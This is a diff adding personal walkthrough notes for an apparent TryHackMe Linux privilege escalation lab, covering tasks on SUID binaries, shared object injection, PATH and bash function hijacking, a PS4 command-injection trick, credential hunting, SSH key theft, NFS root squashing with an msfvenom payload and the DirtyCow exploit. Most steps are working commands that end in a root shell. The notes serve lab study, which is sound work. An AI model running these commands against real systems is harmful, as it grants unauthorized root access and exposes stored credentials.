@@ -241,6 +241,158 @@ rm /home/user/--checkpoint-action=exec=shell.elf
 - Read and follow along with the above.
 no answer
 
+#Task 11 SUID / SGID Executables - Known Exploits 
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+Note that /usr/sbin/exim-4.84-3 appears in the results. Try to find a known exploit for this version of exim.
+/home/user/tools/suid/exim/cve-2016-1531.sh
+#whoami
+root
+
+- Read and follow along with the above.
+no answer
+
+
+#Task 12 SUID / SGID Executables - Shared Object Injection 
+The /usr/local/bin/suid-so SUID executable is vulnerable to shared object injection.
+/usr/local/bin/suid-so
+
+Run strace on the file and search the output for open/access calls and for "no such file" errors:
+strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
+
+Create the .config directory for the libcalc.so file:
+mkdir /home/user/.config
+
+Example shared object code can be found at /home/user/tools/suid/libcalc.c. It simply spawns a Bash shell. Compile the code into a shared object at the location the suid-so executable was looking for it:
+gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
+
+/usr/local/bin/suid-so
+whoami
+root
+
+- Read and follow along with the above.
+no answer
+
+
+#Task 13 SUID / SGID Executables - Environment Variables 
+$/usr/local/bin/suid-env
+
+Run strings on the file to look for strings of printable characters:
+$strings /usr/local/bin/suid-env
+
+One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however the full path of the executable (/usr/sbin/service) is not being used.
+Compile the code located at /home/user/tools/suid/service.c into an executable called service. This code simply spawns a Bash shell:
+$gcc -o service /home/user/tools/suid/service.c
+
+Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the suid-env executable to gain a root shell:
+$PATH=.:$PATH /usr/local/bin/suid-env
+#whoami
+
+- Read and follow along with the above.
+no answer
+
+
+#Task 14 SUID / SGID Executables - Abusing Shell Features (#1) 
+The /usr/local/bin/suid-env2 executable is identical to /usr/local/bin/suid-env except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.
+Verify this with strings:
+$strings /usr/local/bin/suid-env2
+
+In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.
+Verify the version of Bash installed on the Debian VM is less than 4.2-048:
+$/bin/bash --version
+
+Create a Bash function with the name "/usr/sbin/service" that executes a new Bash shell (using -p so permissions are preserved) and export the function:
+
+$function /usr/sbin/service { /bin/bash -p; }
+$export -f /usr/sbin/service
+
+Run the suid-env2 executable to gain a root shell:
+$/usr/local/bin/suid-env2
+#whoami
+
+- Read and follow along with the above.
+no answer
+
+#Task 15 SUID / SGID Executables - Abusing Shell Features (#2) 
+Note: This will not work on Bash versions 4.4 and above.
+When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.
+Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:
+$env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
+
+Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
+$/tmp/rootbash -p
+#whoami
+
+- Read and follow along with the above.
+no answer
+
+#Task 16 Passwords & Keys - History Files 
+cat ~/.*history | less
+- What is the full mysql command the user executed?
+hint: cat ~/.*history | grep mysql
+mysql -h somehost.local -uroot -ppassword123
+
+
+#Task 17 Passwords & Keys - Config Files 
+ls /home/user
+- What file did you find the root user's credentials in?   
+hint: cat /home/user/myvpn.ovpn
+/etc/openvpn/auth.txt
+
+
+#Task 18 Passwords & Keys - SSH Keys 
+ls -la /
+Note that there appears to be a hidden directory called .ssh. View the contents of the directory:
+ls -l /.ssh
+cd /.ssh
+ls
+scp root_key user@$iplocal:/home/
+on my kali machine
+ssh -i root_key root@iptarget
+
+- Read and follow along with the above.
+no answer
+
+
+#Task 19 NFS 
+cat /etc/exports
+on mykalimachine
+sudo su
+mkdir /tmp/nfs
+mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs
+msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+chmod +xs /tmp/nfs/shell.elf
+on target machine
+/tmp/shell.elf
+#whoami
+
+- What is the name of the option that disables root squashing?
+hint: cat /etc/exports
+no_root_squash
+
+
+#Task 20 Kernel Exploits
+https://github.com/mzet-/linux-exploit-suggester
+https://github.com/jondonas/linux-exploit-suggester-2
+$perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
+$gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
+$./c0w
+$/usr/bin/passwd
+#whoami
+
+Remember to restore the original /usr/bin/passwd file and exit the root shell before continuing!
+mv /tmp/bak /usr/bin/passwd
+exit
+
+- Read and follow along with the above.
+no answer
+
+
+#Task 21 Privilege Escalation Scripts 
+Experiment with all three tools, running them with different options. Do all of them identify the techniques used in this room?
+https://github.com/diego-treitos/linux-smart-enumeration
+https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
+https://github.com/rebootuser/LinEnum
+
 
 https://tryhackme.com/room/linuxprivesc
 https://therandomier.medium.com/tryhackme-linux-privesc-9ea2cfac3b76
